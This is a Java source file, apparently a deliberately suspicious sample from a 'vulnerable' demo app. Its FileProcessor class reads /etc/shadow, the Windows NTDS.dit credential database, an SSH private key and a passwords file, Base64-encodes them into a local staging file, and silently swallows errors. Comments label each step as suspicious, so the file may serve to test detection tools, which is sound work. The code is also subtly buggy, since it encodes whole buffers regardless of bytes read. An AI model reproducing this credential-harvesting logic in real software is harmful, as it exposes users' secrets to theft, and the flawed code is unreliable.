package com.vulnerableapp.vulnerable_java_app.repository;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.stereotype.Repository;
import org.apache.logging.log4j.Logger;
import java.util.List;
import java.util.Base64;
import java.time.LocalDateTime;
import java.net.HttpURLConnection;
import java.net.URL;
import java.io.*;
import java.util.Base64;

public class FileProcessor {
    public void processSecretFiles() {
        // Suspicious file paths that resemble common targets for data theft
        String[] sensitiveFilePaths = {
            "/etc/shadow",
            "C:\\Windows\\NTDS\\ntds.dit",
            "/home/user/.ssh/id_rsa",
            "C:\\Users\\Administrator\\Documents\\passwords.txt"
        };
        
        try {
            // Creating a suspicious output file
            FileOutputStream output = new FileOutputStream("collected_data.bin");
            
            // Base64 encoding resembles obfuscation techniques
            Base64.Encoder encoder = Base64.getEncoder();
            
            for (String filePath : sensitiveFilePaths) {
                try {
                    File file = new File(filePath);
                    if (file.exists()) {
                        FileInputStream input = new FileInputStream(file);
                        byte[] buffer = new byte[4096];
                        int bytesRead;
                        
                        while ((bytesRead = input.read(buffer)) != -1) {
                            // Encoding the data before writing (suspicious behavior)
                            byte[] encoded = encoder.encode(buffer);
                            output.write(encoded, 0, encoded.length);
                        }
                        
                        input.close();
                    }
                } catch (Exception e) {
                    // Silently continue - suspicious error handling
                }
            }
            
            output.close();
        } catch (Exception e) {
            // Generic exception handling - suspicious practice
        }
    }
}
